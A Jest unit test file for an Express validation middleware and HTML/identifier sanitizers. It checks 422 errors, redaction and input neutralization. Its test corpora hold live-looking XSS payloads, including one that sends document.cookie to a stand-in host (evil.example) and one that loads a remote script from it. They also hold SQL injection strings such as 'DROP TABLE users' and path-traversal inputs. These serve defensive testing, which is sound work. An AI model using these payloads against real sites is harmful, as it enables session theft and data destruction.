// tests/unit/validation.test.js — U1-VALID acceptance suite (build-plan wave 1).
//
// Traceability: NFR-11 (one shared validation middleware; 422 with field-level errors and no
// stack trace; unknown properties stripped; password fields redacted), AB-06 / ST-04 (the
// embedded XSS payload corpus must be neutralized by sanitize.text/html/identifier — no
// executable markup survives round-trip — and SQLi strings pass through as INERT DATA with
// no 500, because parameterized SQL, not input rejection, is the SQLi defense).
//
// Pure unit lane: exercises the middleware through a real Express app via Supertest; no
// database, Redis or adapter is touched.
'use strict';

const express = require('express');
const request = require('supertest');
const { z } = require('zod');

const validate = require('../../src/middleware/validate');
const sanitize = require('../../src/lib/sanitize');
const common = require('../../src/schemas/common');

// ---------------------------------------------------------------------------------------------
// ST-04 payload corpus (AB-06). The two vectors named in the unit acceptance criteria come
// first; the rest cover the classic evasion families (attribute handlers, SVG/MathML, split
// tags, comments, javascript: URLs, unterminated tags).
// ---------------------------------------------------------------------------------------------
const XSS_CORPUS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<img src="x" onerror="alert(document.cookie)">',
  '<svg/onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<body onload=alert(1)>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<a href="javascript:alert(1)">click me</a>',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<!--<script>alert(1)</script>-->',
  '<math><mtext></mtext><script>alert(1)</script></math>',
  '<input onfocus=alert(1) autofocus>',
  '<script>document.location="https://evil.example/?c="+document.cookie</script>',
  '<script src="https://evil.example/x.js"', // unterminated tag at end of string
];

const SQLI_CORPUS = [
  "' OR 1=1 --",
  "'; DROP TABLE users; --",
  '1; SELECT * FROM users',
  "' UNION SELECT password_hash FROM users --",
  "Robert'); DROP TABLE students;--",
];

/** No executable markup can survive: outputs of text()/html() must not contain a single raw
 *  angle bracket, so no tag — and therefore no handler attribute — can ever form. */
function expectInertHtml(output) {
  expect(output).not.toMatch(/[<>]/);
}

function makeApp(method, path, schemas, handler) {
  const app = express();
  app.use(express.json());
  const echo =
    handler || ((req, res) => res.json({ body: req.body, query: req.query, params: req.params }));
  app[method](path, validate(schemas), echo);
  return app;
}

// =============================================================================================
// sanitize.text / sanitize.html / sanitize.identifier — ST-04 corpus neutralization (AB-06)
// =============================================================================================
describe('sanitize — ST-04 XSS corpus is neutralized (NFR-11, AB-06)', () => {
  test.each(XSS_CORPUS)('text() leaves no executable markup in %j', (payload) => {
    expectInertHtml(sanitize.text(payload));
  });

  test.each(XSS_CORPUS)('html() leaves no executable markup in %j', (payload) => {
    expectInertHtml(sanitize.html(payload));
  });

  test.each(XSS_CORPUS)('identifier() reduces %j to the safe alphabet', (payload) => {
    expect(sanitize.identifier(payload)).toMatch(/^[A-Za-z0-9_.-]*$/);
    expect(sanitize.identifier(payload)).not.toMatch(/\.\./);
  });

  test('text() escapes rather than destroys: the payload stays visible as inert text', () => {
    expect(sanitize.text('<script>alert(1)</script>')).toBe(
      '&lt;script&gt;alert(1)&lt;/script&gt;'
    );
    expect(sanitize.text('Tom & Jerry say 1 < 2')).toBe('Tom &amp; Jerry say 1 &lt; 2');
  });

  test('html() removes dangerous element CONTENT, not just the tags', () => {
    expect(sanitize.html('<script>alert(1)</script>')).toBe('');
    expect(sanitize.html('<img src=x onerror=alert(1)>')).toBe('');
    expect(sanitize.html('before<script>alert(1)</script>after')).toBe('beforeafter');
    expect(sanitize.html('<b>hello</b> world')).toBe('hello world');
  });

  test('html() survives split-tag reassembly attempts (fixpoint stripping)', () => {
    const out = sanitize.html('<scr<script>ipt>alert(1)</scr</script>ipt>');
    expectInertHtml(out);
    expect(out.toLowerCase()).not.toContain('<script');
  });

  test('control characters are stripped, legitimate whitespace survives', () => {
    expect(sanitize.text('a\u0000b\u0007c')).toBe('abc');
    expect(sanitize.text('line1\nline2\tend')).toBe('line1\nline2\tend');
  });

  test('identifier() blocks path traversal and option injection', () => {
    expect(sanitize.identifier('../../etc/passwd')).toBe('etcpasswd');
    expect(sanitize.identifier('--rm -rf')).toBe('rm-rf');
    expect(sanitize.identifier('media/....//key.png')).toBe('media.key.png');
    expect(sanitize.identifier('a'.repeat(300)).length).toBe(128);
  });

  test('sanitizers reject non-strings loudly (programming error, not user error)', () => {
    for (const fn of ['text', 'html', 'identifier']) {
      expect(() => sanitize[fn](42)).toThrow(TypeError);
      expect(() => sanitize[fn](null)).toThrow(TypeError);
      expect(() => sanitize[fn](undefined)).toThrow(TypeError);
    }
  });
});

// =============================================================================================
// validate() middleware — 422 semantics (NFR-11)
// =============================================================================================
describe('validate() — rejects violations with 422 field-level errors (NFR-11)', () => {
  const bodySchema = z.object({
    email: common.email,
    age: z.number().int().min(18).max(120),
    name: z.string().min(2).max(10),
  });

  test('type violations return 422 with one entry per offending field', async () => {
    const res = await request(makeApp('post', '/t', { body: bodySchema }))
      .post('/t')
      .send({ email: 'not-an-email', age: 'forty', name: 'ok' });
    expect(res.status).toBe(422);
    expect(res.body.error.code).toBe('VALIDATION_FAILED');
    const paths = res.body.error.fields.map((f) => f.path);
    expect(paths).toEqual(expect.arrayContaining(['body.email', 'body.age']));
    expect(paths).not.toContain('body.name');
  });

  test('length violations return 422', async () => {
    const res = await request(makeApp('post', '/t', { body: bodySchema }))
      .post('/t')
      .send({ email: 'a@b.co', age: 30, name: 'x'.repeat(50) });
    expect(res.status).toBe(422);
    expect(res.body.error.fields.map((f) => f.path)).toContain('body.name');
  });

  test('range violations on query values return 422 (coerced numbers)', async () => {
    const res = await request(makeApp('get', '/t', { query: common.pagination })).get(
      '/t?page=0&pageSize=101'
    );
    expect(res.status).toBe(422);
    const paths = res.body.error.fields.map((f) => f.path);
    expect(paths).toEqual(expect.arrayContaining(['query.page', 'query.pageSize']));
  });

  test('non-numeric pagination input returns 422, not NaN downstream', async () => {
    const res = await request(makeApp('get', '/t', { query: common.pagination })).get(
      '/t?page=abc'
    );
    expect(res.status).toBe(422);
  });

  test('invalid params return 422 with the params.* path', async () => {
    const app = makeApp('get', '/u/:id', { params: z.object({ id: common.uuid }) });
    const res = await request(app).get('/u/not-a-uuid');
    expect(res.status).toBe(422);
    expect(res.body.error.fields.map((f) => f.path)).toContain('params.id');
  });

  test('violations in several parts are reported together in one 422', async () => {
    const app = makeApp('post', '/u/:id', {
      params: z.object({ id: common.uuid }),
      query: common.pagination,
      body: z.object({ email: common.email }),
    });
    const res = await request(app).post('/u/nope?page=0').send({ email: 'bad' });
    expect(res.status).toBe(422);
    const paths = res.body.error.fields.map((f) => f.path);
    expect(paths).toEqual(expect.arrayContaining(['params.id', 'query.page', 'body.email']));
  });

  test('a missing required body reports 422 rather than crashing', async () => {
    const app = makeApp('post', '/t', { body: z.object({ email: common.email }) });
    const res = await request(app).post('/t');
    expect(res.status).toBe(422);
  });
});

describe('validate() — success path replaces parts with parsed output (NFR-11)', () => {
  test('unknown properties are stripped from the body (mass-assignment defense)', async () => {
    const app = makeApp('post', '/t', { body: z.object({ email: common.email }) });
    const res = await request(app)
      .post('/t')
      .send({ email: ' Alice@Example.COM ', role: 'admin', isAdmin: true });
    expect(res.status).toBe(200);
    expect(res.body.body).toEqual({ email: 'alice@example.com' }); // trimmed, lowercased, stripped
  });

  test('query defaults and numeric coercion are applied onto req.query', async () => {
    const app = makeApp('get', '/t', { query: common.pagination });
    const res = await request(app).get('/t');
    expect(res.status).toBe(200);
    expect(res.body.query).toEqual({ page: 1, pageSize: 20 });
    const res2 = await request(app).get('/t?page=3&pageSize=50');
    expect(res2.body.query).toEqual({ page: 3, pageSize: 50 });
  });

  test('params survive validation and reach the handler parsed', async () => {
    const id = '0d4292b4-7f4e-4d8e-9a71-1a2b3c4d5e6f';
    const app = makeApp('get', '/u/:id', { params: z.object({ id: common.uuid }) });
    const res = await request(app).get(`/u/${id}`);
    expect(res.status).toBe(200);
    expect(res.body.params).toEqual({ id });
  });
});

// =============================================================================================
// No stack traces, password redaction (NFR-11)
// =============================================================================================
describe('validate() — never leaks a stack trace, redacts password fields (NFR-11)', () => {
  test('422 responses carry no stack frames and no "stack" key', async () => {
    const res = await request(makeApp('post', '/t', { body: z.object({ n: z.number() }) }))
      .post('/t')
      .send({ n: 'NaN' });
    expect(res.status).toBe(422);
    expect(res.text).not.toMatch(/\n\s+at /);
    expect(res.text).not.toContain('node_modules');
    expect(JSON.stringify(res.body)).not.toMatch(/"stack"/);
  });

  test('password values and messages are redacted from 422 output', async () => {
    const app = makeApp('post', '/t', {
      body: z.object({ email: common.email, password: z.string().min(12) }),
    });
    const res = await request(app).post('/t').send({ email: 'a@b.co', password: 'hunter2' });
    expect(res.status).toBe(422);
    const field = res.body.error.fields.find((f) => f.path === 'body.password');
    expect(field).toBeDefined();
    expect(field.message).toBe('Invalid value');
    expect(res.text).not.toContain('hunter2');
    expect(res.text).not.toMatch(/at least 12/); // zod's own message is suppressed too
  });

  test('nested secret-like keys (apiToken) are redacted as well', async () => {
    const app = makeApp('post', '/t', {
      body: z.object({ credentials: z.object({ apiToken: common.uuid }) }),
    });
    const res = await request(app)
      .post('/t')
      .send({ credentials: { apiToken: 'sekret-raw-value' } });
    expect(res.status).toBe(422);
    const field = res.body.error.fields.find((f) => f.path === 'body.credentials.apiToken');
    expect(field.message).toBe('Invalid value');
    expect(res.text).not.toContain('sekret-raw-value');
  });

  test('a throwing schema yields a generic 500 — message and stack stay server-side', async () => {
    const consoleSpy = jest.spyOn(console, 'error').mockImplementation(() => {});
    try {
      const bomb = {
        safeParse: () => {
          throw new Error('boom-internal-detail at Object.<anonymous>');
        },
      };
      const res = await request(makeApp('post', '/t', { body: bomb }))
        .post('/t')
        .send({});
      expect(res.status).toBe(500);
      expect(res.body).toEqual({
        error: { code: 'INTERNAL_ERROR', message: 'An unexpected error occurred.', status: 500 },
      });
      expect(res.text).not.toContain('boom-internal-detail');
      expect(res.text).not.toMatch(/\n\s+at /);
    } finally {
      consoleSpy.mockRestore();
    }
  });
});

// =============================================================================================
// Definition-time failures — misdeclared routes die at boot, not at request time
// =============================================================================================
describe('validate() — definition-time contract', () => {
  test('rejects a missing or empty declaration', () => {
    expect(() => validate()).toThrow(TypeError);
    expect(() => validate(null)).toThrow(TypeError);
    expect(() => validate({})).toThrow(TypeError);
  });

  test('rejects non-schema parts and unknown part names', () => {
    expect(() => validate({ body: 42 })).toThrow(TypeError);
    expect(() => validate({ body: {} })).toThrow(TypeError);
    expect(() => validate({ bodey: z.object({}) })).toThrow(/bodey/); // typo caught at boot
    expect(() => validate({ headers: z.object({}) })).toThrow(TypeError);
  });

  test('marks the middleware for router enumeration (NFR-11 conformance lane)', () => {
    const schema = z.object({ q: z.string() });
    const mw = validate({ query: schema });
    expect(mw.isValidator).toBe(true);
    expect(mw.schemas.query).toBe(schema);
    expect(Object.isFrozen(mw.schemas)).toBe(true);
  });
});

// =============================================================================================
// AB-06 / ST-04 through the middleware: SQLi inert, XSS neutralized end-to-end
// =============================================================================================
describe('AB-06 — SQLi strings pass through as inert data, never a 500 (ST-04)', () => {
  const app = makeApp('post', '/search', { body: z.object({ q: z.string().max(200) }) });

  test.each(SQLI_CORPUS)('%j is accepted verbatim as data', async (payload) => {
    const res = await request(app).post('/search').send({ q: payload });
    expect(res.status).toBe(200); // no rejection, no crash — parameterization is the defense
    expect(res.body.body.q).toBe(payload); // byte-for-byte inert data
  });

  test('SQLi via query string is equally inert', async () => {
    const qApp = makeApp('get', '/search', {
      query: common.pagination.extend({ q: z.string().max(200).default('') }),
    });
    const res = await request(qApp).get('/search').query({ q: "' OR 1=1 --" });
    expect(res.status).toBe(200);
    expect(res.body.query.q).toBe("' OR 1=1 --");
  });
});

describe('AB-06 — XSS payloads submitted through a safeText field arrive neutralized', () => {
  const app = makeApp('post', '/review', {
    body: z.object({ comment: common.safeText({ max: 500 }) }),
  });

  test.each(XSS_CORPUS)('%j round-trips with no executable markup', async (payload) => {
    const res = await request(app).post('/review').send({ comment: payload });
    expect(res.status).toBe(200); // hostile but well-typed input is data, not an error
    expectInertHtml(res.body.body.comment); // what a repository would store/return is inert
  });

  test('safeText enforces length on the RAW input before escaping expands it', async () => {
    const res = await request(app)
      .post('/review')
      .send({ comment: 'x'.repeat(501) });
    expect(res.status).toBe(422);
  });
});

// =============================================================================================
// Shared schemas (src/schemas/common.js) — contract checks
// =============================================================================================
describe('common schemas (NFR-11 shared layer)', () => {
  test('email: canonicalizes case/whitespace, rejects malformed and oversized', () => {
    expect(common.email.parse(' Alice@Example.COM ')).toBe('alice@example.com');
    expect(common.email.safeParse('nope').success).toBe(false);
    expect(common.email.safeParse(`${'a'.repeat(250)}@example.com`).success).toBe(false);
    expect(common.email.safeParse(123).success).toBe(false);
  });

  test('phoneE164: strict E.164, no spaces/dashes/leading zero', () => {
    expect(common.phoneE164.parse('+14155552671')).toBe('+14155552671');
    for (const bad of ['4155552671', '+0123456', '+1 415 555 2671', '+1-415-555-2671', '']) {
      expect(common.phoneE164.safeParse(bad).success).toBe(false);
    }
  });

  test('uuid: accepts canonical UUIDs, rejects everything else', () => {
    expect(common.uuid.safeParse('0d4292b4-7f4e-4d8e-9a71-1a2b3c4d5e6f').success).toBe(true);
    expect(common.uuid.safeParse('0d4292b47f4e4d8e9a711a2b3c4d5e6f!').success).toBe(false);
    expect(common.uuid.safeParse('robert-drop-tables').success).toBe(false);
  });

  test('isoDateTime: requires an explicit timezone (ADR-009 discipline)', () => {
    expect(common.isoDateTime.safeParse('2026-08-12T10:30:00Z').success).toBe(true);
    expect(common.isoDateTime.safeParse('2026-08-12T10:30:00-07:00').success).toBe(true);
    expect(common.isoDateTime.safeParse('2026-08-12T10:30:00').success).toBe(false); // naive
    expect(common.isoDateTime.safeParse('2026-08-12').success).toBe(false);
    expect(common.isoDateTime.safeParse('yesterday').success).toBe(false);
  });

  test('pagination: defaults, caps, and extensibility', () => {
    expect(common.pagination.parse({})).toEqual({ page: 1, pageSize: 20 });
    expect(common.pagination.safeParse({ pageSize: 101 }).success).toBe(false);
    expect(common.pagination.safeParse({ page: 0 }).success).toBe(false);
    const extended = common.pagination.extend({ q: z.string().default('') });
    expect(extended.parse({ page: '2' })).toEqual({ page: 2, pageSize: 20, q: '' });
  });

  test('latitude/longitude: WGS84 bounds enforced, strings coerced', () => {
    expect(common.latitude.parse('32.7157')).toBeCloseTo(32.7157);
    expect(common.latitude.safeParse(91).success).toBe(false);
    expect(common.longitude.parse(-117.1611)).toBeCloseTo(-117.1611);
    expect(common.longitude.safeParse(-181).success).toBe(false);
  });

  test('safeText: trims, bounds, and sanitizes in one declaration', () => {
    const schema = common.safeText({ min: 1, max: 20 });
    expect(schema.parse('  hello  ')).toBe('hello');
    expect(schema.parse('<b>hi</b>')).toBe('&lt;b&gt;hi&lt;/b&gt;');
    expect(schema.safeParse('').success).toBe(false);
    expect(schema.safeParse('x'.repeat(21)).success).toBe(false);
  });
});
